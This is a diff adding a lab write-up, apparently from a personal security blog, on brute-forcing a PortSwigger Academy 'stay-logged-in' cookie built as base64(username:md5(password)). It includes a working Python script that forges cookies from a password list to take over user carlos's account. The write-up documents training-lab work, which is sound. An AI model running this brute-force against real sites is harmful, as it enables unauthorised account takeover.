@@ -160,3 +160,89 @@ Now I replaced it as the password value in the request
 After forwarding the request I got logged in
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c1a25b8-2c6c-4624-8de5-2cc007bf63b9)
 
+
+<h3> Brute-forcing a stay-logged-in cookie </h3>
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e73798c-5592-4825-9877-9c310fb72049)
+
+Going over to the web app login page shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57ea7e14-ecf1-4395-81bb-ce6635679bc5)
+
+When i tried login in as user wiener with the password as peter and i intercepted the request in burp suite i saw this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b1674a4c-8097-4239-a63e-9ea832d824fd)
+
+Then I got logged in 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1eb89a5a-adfd-4aa6-a6ae-297185e258bd)
+
+Nothing too interesting there
+
+But now there's a remember me button on the login page 
+
+So i went ahead to login again but this time around click the button
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/33cdb04d-1233-4c55-85a6-e5aef08e538f)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/39057f15-b8fb-477d-b945-326f2d228e9c)
+
+It created a stay logged in cookie for us
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1ed563b4-599d-4760-94c1-68e3286c8a13)
+
+Seems like it's encoded
+
+Using cyberchef I decoded it and it turns out to be a base64 string
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/49ac80ca-78c3-4a30-8a48-8084848b1499)
+
+```
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+```
+
+Hmmmm 🤔
+
+This looks like a hash
+
+Using crackstation to decode it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7993e2e3-a9da-42d8-8c34-45de0f758b95)
+
+Now we know the way the web server creates the stay logged in cookie
+
+By taking the base64 encoded form of the hash of a password along side with the username:
+
+```
+base64(username:md5hash(password))
+```
+
+Since the aim is to get logged in as user carlos and we are already given a password list
+
+I wrote a script to automate that for me
+
+```python
+import requests
+from base64 import b64encode, b64decode
+from hashlib import md5
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+with open('passwords.txt', 'r') as f:
+    passwords = [i.strip() for i in f.readlines()]
+
+url = 'https://0aa9007b04ad189280c7801c00ea00ed.web-security-academy.net/my-account'
+proxy = {'https': 'http://127.0.0.1:8080'}
+
+for password in passwords:
+    bytes_ = password.encode()
+    hash_ = md5(bytes_).hexdigest()
+    signed_in = 'carlos:' + hash_
+    encoded = b64encode(signed_in.encode()).decode()
+    cookies = {
+        'stay-logged-in': encoded
+    }
+
+    req = requests.get(url, cookies=cookies, proxies=proxy, verify=False)
+    if len(req.text) != 4884:
+        print('Password found: ' + password)
+        break
+```
+
+Running it gives us the password
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8092d91e-309f-49df-b33a-ce2a38bfab8e)
+
+We can then use that to login
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8fdcddfc-68cb-4bfb-ab23-99fe504f87a2)
+
